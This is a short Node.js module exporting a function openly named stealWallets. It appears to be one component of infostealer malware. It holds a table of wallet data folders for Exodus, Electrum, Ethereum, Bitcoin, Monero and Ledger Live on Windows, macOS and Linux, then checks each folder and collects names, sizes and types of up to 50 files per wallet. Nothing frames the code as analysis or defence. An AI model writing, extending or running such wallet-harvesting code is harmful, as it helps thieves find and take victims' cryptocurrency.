import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const WALLET_PATHS = {
  win32: [
    ["Exodus", path.join(process.env.APPDATA, "Exodus")],
    ["Electrum", path.join(process.env.APPDATA, "Electrum")],
    ["Ethereum", path.join(process.env.APPDATA, "Ethereum")],
    ["Bitcoin", path.join(process.env.APPDATA, "Bitcoin")],
    ["Monero", path.join(process.env.APPDATA, "Monero")],
    ["Ledger Live", path.join(process.env.APPDATA, "Ledger Live")],
  ],
  darwin: [
    ["Exodus", path.join(os.homedir(), "Library", "Application Support", "Exodus")],
    ["Electrum", path.join(os.homedir(), ".electrum")],
    ["Bitcoin", path.join(os.homedir(), "Library", "Application Support", "Bitcoin")],
  ],
  linux: [
    ["Exodus", path.join(os.homedir(), ".config", "Exodus")],
    ["Electrum", path.join(os.homedir(), ".electrum")],
    ["Bitcoin", path.join(os.homedir(), ".bitcoin")],
  ],
};

export function stealWallets() {
  const p = os.platform();
  const list = WALLET_PATHS[p] || [];
  const result = { wallets: [] };

  for (const [name, base] of list) {
    if (!fs.existsSync(base)) continue;
    try {
      const files = fs.readdirSync(base).slice(0, 50);
      const fileInfos = files.map(f => {
        const full = path.join(base, f);
        try {
          const stat = fs.statSync(full);
          return { file: f, size: stat.size, isDir: stat.isDirectory() };
        } catch { return { file: f }; }
      });
      result.wallets.push({ name, path: base, files: fileInfos });
    } catch {}
  }
  return result;
}
